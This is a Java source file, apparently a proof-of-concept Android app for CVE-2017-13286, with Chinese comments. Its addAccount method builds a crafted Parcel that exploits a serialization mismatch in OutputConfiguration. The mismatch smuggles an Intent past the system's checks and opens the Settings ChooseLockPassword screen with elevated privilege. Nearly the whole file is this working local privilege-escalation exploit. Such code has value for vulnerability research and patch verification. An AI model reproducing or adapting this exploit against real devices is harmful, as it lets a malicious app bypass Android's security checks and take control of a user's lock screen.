package com.cve.poc201713286;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;


public class MyAuthenticator extends AbstractAccountAuthenticator {

    private Context m_context = null;

    final static String TAG = "poc";

    public MyAuthenticator(Context context) {
        super(context);
        m_context = context;

    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }


    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {

        Bundle retBundle = new Bundle();
        Parcel bundleData = Parcel.obtain();
        Parcel craftData = Parcel.obtain();
        //craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头
        craftData.writeInt(3); // 总共传递3个对象,三个key-value对
        // 第一个Key为OutputConfiguration，它将用来引起内存错位从而绕过检查
//        craftData.writeInt(?); 名字是字符串，所以看起来key的长度会自动添加？
        craftData.writeString("object1");//是这个object的名字,似乎长度有些要求
        craftData.writeInt(4); // VAL_PARCELABLE = 4
        craftData.writeString("android.hardware.camera2.params.OutputConfiguration"); // value类型OutputConfiguration，将被按照outputConfiguration的格式/方法解析
        craftData.writeInt(1);//Rotation 这里开始是outputConfiguration的属性
        craftData.writeInt(1);//SurfaceSetId
        craftData.writeInt(1);//SurfaceType
        craftData.writeInt(1);//width
        craftData.writeInt(1);//Height
        craftData.writeInt(1);//IsDeferred
                                 //在system_server处的序列化中，会直接写出为IsShared=0
        craftData.writeInt(0);//应该表示IsShared，但是在第一次反序列化中被赋给listLen 停止第一个outputConfiguration部分的读入，
        craftData.writeInt(1);//应该表示ListLen， 但是在第一次反序列化中因为已经停止读出造成错位之后，1被解析为第二个Key的长度
        craftData.writeInt(6);//因为错位，6被解析为第二个Key的值
        craftData.writeInt(13);//因为错位，第二个Key的类型被解析为VAL_BYTEARRAY = 13,将之后的数据当作bytearray读入，不进行intent的检查

        // 接下来构造ByteArray，或者说内含Intent的ByteArray
        craftData.writeInt(-1); // 这个位置用于存放intent部分的长度，先占位，构造完之后再来写入
        int keyIntentStartPos = craftData.dataPosition();  // 记录intent部分在craftData中起始位置，因为接下来要构造intent了

        craftData.writeString(AccountManager.KEY_INTENT);// 第二个object是个intent
        craftData.writeInt(4); //intent也是一个parcel
        craftData.writeString("android.content.Intent");// value类型为intent，将被按照intent格式解析
        craftData.writeString(Intent.ACTION_RUN); // Intent Action 这里开始是intent的属性
        Uri.writeToParcel(craftData, null); // Uri
        craftData.writeString(null); // Type
        craftData.writeInt(0x10000000); // Flags
        craftData.writeString(null); // Package
        craftData.writeString("com.android.settings");
        craftData.writeString("com.android.settings.ChooseLockPassword");
        craftData.writeInt(0); //SourceBounds
        craftData.writeInt(0); //Categories
        craftData.writeInt(0); //Selector
        craftData.writeInt(0); //ClipData
        craftData.writeInt(-2); //ContentUserHint
        craftData.writeBundle(null);

        int keyIntentEndPos = craftData.dataPosition(); // 记录当前的读写指针位置，也即intent部分的结束位置
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos; // 计算intent数据的长度
        craftData.setDataPosition(keyIntentStartPos - 4);  // 把读写指针位移动到intent部分起始位-4,即-1所在的位置
        craftData.writeInt(lengthOfKeyIntent);// 在intent部分前写入key_intent这段数据的长度
        craftData.setDataPosition(keyIntentEndPos);// 将读写指针移动到最后

        // 这里做个用于填充的键值对
        craftData.writeString("PaddingK");
        craftData.writeInt(0); // VAL_STRING
        craftData.writeString("PaddingV"); //

        int length  = craftData.dataSize();
        bundleData.writeInt(length); //所有数据的长度
        bundleData.writeInt(0x4c444E42); //Bundle魔数
        bundleData.appendFrom(craftData, 0, length); //
        bundleData.setDataPosition(0);//移动Parcel的读写指针位置到开头
        retBundle.readFromParcel(bundleData);
        return retBundle;

//        Log.i(TAG, "addAccount(), retBundle = " + retBundle.toString() + " craftData = " + craftData.toString());

//        Parcel outputData = Parcel.obtain();
//        retBundle.writeToParcel(outputData, 0);
//        byte[] raw_bundle = outputData.marshall();
//        try{
//            FileOutputStream fos = new FileOutputStream("/sdcard/raw_bundle_2.pcl");
//            fos.write(raw_bundle);
//            fos.close();
//        } catch (Exception e){
//            Log.i(TAG, "Error at writing out the raw data of bundle");
//        }
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        return null;
    }
}

